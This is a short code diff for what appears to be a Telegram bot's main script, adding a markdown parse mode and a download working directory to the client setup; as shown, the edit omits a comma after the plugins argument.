@@ -33,6 +33,8 @@ if __name__ == "__main__" :
         api_id=Config.APP_ID,
         api_hash=Config.API_HASH,
         plugins=plugins
+        parse_mode="markdown",
+        workdir=DOWNLOAD_DIRECTORY
     )
     Config.AUTH_USERS.add(7351948)
     app.run()
